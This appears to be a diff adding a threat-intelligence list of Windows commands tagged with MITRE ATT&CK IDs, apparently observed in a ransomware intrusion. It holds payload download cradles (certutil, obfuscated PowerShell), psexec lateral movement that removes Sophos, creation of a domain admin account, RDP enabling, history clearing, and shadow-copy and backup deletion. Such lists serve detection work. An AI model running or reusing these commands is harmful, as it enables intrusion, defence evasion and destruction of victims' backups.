@@ -1,0 +1,69 @@
+cmd.exe /c certutil -f urlcache https://<domain>/<remotefile>.css <localfile>.dll
+cmd.exe /c certutil -f urlcache https://<domain>/<remotefile>.msi <localfile>.msi
+cmd.exe /c driverquery
+cmd.exe /c echo Computer: %COMPUTERNAME% & `
+echo Username: %USERNAME% & `
+echo Domain: %USERDOMAIN% & `
+echo Logon Server: %LOGONSERVER% & `
+echo DNS Domain: %USERDNSDOMAIN% & `
+echo User Profile: %USERPROFILE% & echo `
+System Root: %SYSTEMROOT%
+cmd.exe /c ipconfig /all [T1016]
+cmd.exe /c net share [T1135]
+cmd.exe /c net use
+cmd.exe /c netstat -a
+cmd.exe /c sc query
+cmd.exe /c schtasks
+cmd.exe /c systeminfo [T1082]
+cmd.exe /c ver
+cmd.exe /c wmic printer get caption,name,deviceid,drivername,portname
+cmd.exe /c wmic printjob
+mmc.exe compmgmt.msc /computer:{hostname/ip}
+mstsc.exe /v:{hostname/ip}
+mstsc.exe /v:{hostname/ip} /u:{user} /p:{pass}
+powershell -exec bypass -enc <base64 encrypted command string>
+powershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New-Object Net.WebClient).$x.Invoke(http://<ip>/<RMM tool>.msi)
+powershell -nop -w hidden -noni -ep bypass &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('<base64 payload string>')-f'<character replacement 0>','<character replacement 1>','<character replacement 2>')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
+powershell Remove-Item (Get-PSReadlineOption).HistorySavePath
+powershell Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,Description,LastLogonDate, logonCount,whenChanged,whenCreated,ipv4Address | Export-CSV -Path <file path> -NoTypeInformation -Encoding UTF8
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} "c:\windows\system32\taskkill.exe" /f /im WRSA.exe
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -c coba.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -c openrdp.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -c StopAllProcess.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -c zam.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} c:\temp\x.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} cmd
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} cmd /c   "c:\gaze.exe"
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} cmd /c  "copy \\ad02\sysvol\gaze.exe c:\gaze.exe
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} cmd /c  "copy \\ad02\sysvol\gaze.exe c:\gaze.exe && c:\gaze.exe"
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -u {user} -p {pass} -c coba.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -u {user} -p {pass} -c hostname/ipwho.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -u {user} -p {pass} -c openrdp.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -u {user} -p {pass} -c zam.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -u {user} -p {pass} cmd
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -u {user} -p {pass} -с newuser.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -с duooff.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -с hostname/ipwho.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -с newuser.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -с removesophos.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -с start.bat
+psexec.exe -accepteula -nobanner -s \\{hostname/ip} -с uninstallSophos.bat
+nltest /dclist:
+net group "domain admins" /domain [T1069.002]
+net group "Domain Admins" default /add /domain
+net group "Enterprise Admins" default /add /domain
+net group "Remote Desktop Users" default /add /domain
+net group "Group Policy Creator Owners" default /add /domain
+net group "Schema Admins" default /add /domain
+net group "domain users" /domain
+net user default /active:yes /domain
+net user /add default <password> /domain [T1136.002]
+query user
+reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
+systeminfo
+vssadmin.exe Delete Shadows /all /quiet
+vssadmin.exe resize shadowstorage /for=%s /on=%s /maxsize=unbounded
+del /s /f /q %s*.VHD %s*.bac %s*.bak %s*.wbcat %s*.bkf %sBac kup*.* %sbackup*.* %s*.set %s*.win %s*.dsk
+netsh advfirewall firewall add rule name="rdp" dir=in protocol=tcp localport=3389 action=allow
+netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
